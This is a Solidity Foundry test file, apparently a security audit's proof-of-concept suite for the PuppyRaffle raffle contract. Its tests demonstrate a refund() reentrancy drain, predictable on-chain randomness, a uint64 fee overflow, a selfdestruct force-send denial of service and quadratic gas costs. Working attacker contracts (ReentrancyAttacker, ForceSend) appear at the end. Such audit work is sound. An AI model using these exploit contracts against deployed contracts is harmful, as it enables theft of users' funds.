// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

/// @title DuoLaSafe PoC suite for PuppyRaffle
/// @notice Each test is a working proof-of-concept for a real finding.
contract DuoLaSafePoC is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
    }

    function _enter(uint256 n) internal {
        address[] memory players = new address[](n);
        for (uint256 i = 0; i < n; i++) {
            players[i] = address(uint160(i + 1));
        }
        puppyRaffle.enterRaffle{value: entranceFee * n}(players);
    }

    // ------------------------------------------------------------------
    // FINDING H-01: Reentrancy in refund() drains the whole contract
    // ------------------------------------------------------------------
    function test_H01_ReentrancyDrainsContract() public {
        // 4 honest players seed the prize pool.
        _enter(4);

        uint256 startingContractBalance = address(puppyRaffle).balance;
        assertEq(startingContractBalance, 4 ether);

        ReentrancyAttacker attacker = new ReentrancyAttacker(puppyRaffle, entranceFee);
        vm.deal(address(attacker), entranceFee);

        uint256 attackerStart = address(attacker).balance;

        attacker.attack();

        uint256 attackerEnd = address(attacker).balance;
        uint256 contractEnd = address(puppyRaffle).balance;

        console.log("attacker invested :", attackerStart);
        console.log("attacker final    :", attackerEnd);
        console.log("contract drained  :", startingContractBalance + entranceFee - contractEnd);

        // Contract fully drained, attacker walks away with everyone's money.
        assertEq(contractEnd, 0);
        assertEq(attackerEnd, startingContractBalance + entranceFee); // 4 honest + own stake = 5 ether
    }

    // ------------------------------------------------------------------
    // FINDING H-02: Weak randomness — winner & rarity are predictable
    // An attacker simulates the exact RNG off-chain (here: in-tx) and only
    // calls selectWinner in a block where THEY are the winner.
    // ------------------------------------------------------------------
    function test_H02_PredictableWinner() public {
        _enter(4); // players are address(1..4)

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // Attacker reproduces the contract's RNG with public inputs.
        uint256 predictedIndex =
            uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % 4;
        address predictedWinner = puppyRaffle.players(predictedIndex);

        // Attacker also predicts rarity (same public inputs).
        uint256 predictedRarity =
            uint256(keccak256(abi.encodePacked(address(this), block.difficulty))) % 100;

        puppyRaffle.selectWinner();

        // Prediction matches reality exactly => RNG is not random.
        assertEq(puppyRaffle.previousWinner(), predictedWinner);
        console.log("predicted winner index:", predictedIndex);
        console.log("predicted rarity roll :", predictedRarity);
        console.log("actual winner         :", puppyRaffle.previousWinner());
    }

    // ------------------------------------------------------------------
    // FINDING H-03: uint64 totalFees overflow — fee accounting corrupts,
    // and withdrawFees becomes permanently unmatchable.
    // type(uint64).max wei ~= 18.44 ether. With 20% fee, ~92 ether collected
    // wraps totalFees around, so accounted fees are far less than real balance.
    // ------------------------------------------------------------------
    function test_H03_FeeOverflow() public {
        // First raffle: collect enough that the 20% fee exceeds uint64 max.
        // 100 players * 1 ether = 100 ether; fee = 20 ether > type(uint64).max (~18.44 ether)
        uint256 n = 100;
        address[] memory players = new address[](n);
        for (uint256 i = 0; i < n; i++) {
            players[i] = address(uint160(i + 1));
        }
        puppyRaffle.enterRaffle{value: entranceFee * n}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();

        uint256 realFeeBalance = address(puppyRaffle).balance; // actual ETH held as fees
        uint256 accountedFees = puppyRaffle.totalFees();       // uint64 wrapped value

        console.log("real fee ETH in contract :", realFeeBalance);
        console.log("totalFees (uint64)       :", accountedFees);

        // The accounted fee has overflowed and is LESS than the real balance held.
        assertLt(accountedFees, realFeeBalance);
        assertEq(realFeeBalance, 20 ether); // 20% of 100 ether

        // withdrawFees requires address(this).balance == totalFees, which can
        // never hold now => fees are permanently stuck.
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    // ------------------------------------------------------------------
    // FINDING H-04: withdrawFees DoS via forced ETH (selfdestruct).
    // The strict equality address(this).balance == totalFees can be broken
    // forever by force-sending wei, bricking all fee withdrawals.
    // ------------------------------------------------------------------
    function test_H04_WithdrawFeesDoS() public {
        _enter(4);
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();

        // Now totalFees == contract balance, withdraw would normally work.
        // Attacker force-sends 1 wei via selfdestruct.
        ForceSend bomb = new ForceSend{value: 1 wei}();
        bomb.boom(payable(address(puppyRaffle)));

        // Balance no longer equals totalFees => withdrawFees bricked forever.
        assertGt(address(puppyRaffle).balance, puppyRaffle.totalFees());
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    // ------------------------------------------------------------------
    // FINDING H-05: DoS in enterRaffle — O(n^2) duplicate check.
    // Gas cost to enter scales quadratically; later entrants pay far more,
    // and a large enough player set makes entry unaffordable / revert.
    // ------------------------------------------------------------------
    function test_H05_EnterRaffleQuadraticGasDoS() public {
        // First batch of 100 players.
        address[] memory first = new address[](100);
        for (uint256 i = 0; i < 100; i++) {
            first[i] = address(uint160(i + 1));
        }
        uint256 g0 = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * 100}(first);
        uint256 gasFirst100 = g0 - gasleft();

        // Second batch of 100 players (indices 101..200).
        address[] memory second = new address[](100);
        for (uint256 i = 0; i < 100; i++) {
            second[i] = address(uint160(i + 101));
        }
        uint256 g1 = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * 100}(second);
        uint256 gasSecond100 = g1 - gasleft();

        console.log("gas for first  100 players:", gasFirst100);
        console.log("gas for second 100 players:", gasSecond100);

        // Same number of players, but the second batch costs dramatically more
        // because of the O(n^2) duplicate loop over the growing array.
        assertGt(gasSecond100, gasFirst100 * 2);
    }
}

/// @notice Reentrancy attacker for refund()
contract ReentrancyAttacker {
    PuppyRaffle private immutable raffle;
    uint256 private immutable fee;
    uint256 private myIndex;

    constructor(PuppyRaffle _raffle, uint256 _fee) {
        raffle = _raffle;
        fee = _fee;
    }

    function attack() external {
        address[] memory me = new address[](1);
        me[0] = address(this);
        raffle.enterRaffle{value: fee}(me);
        myIndex = raffle.getActivePlayerIndex(address(this));
        raffle.refund(myIndex);
    }

    function _steal() private {
        if (address(raffle).balance >= fee) {
            raffle.refund(myIndex);
        }
    }

    receive() external payable {
        _steal();
    }

    fallback() external payable {
        _steal();
    }
}

/// @notice Force-sends ETH via selfdestruct to bypass any payable guard.
contract ForceSend {
    constructor() payable {}

    function boom(address payable target) external {
        selfdestruct(target);
    }
}
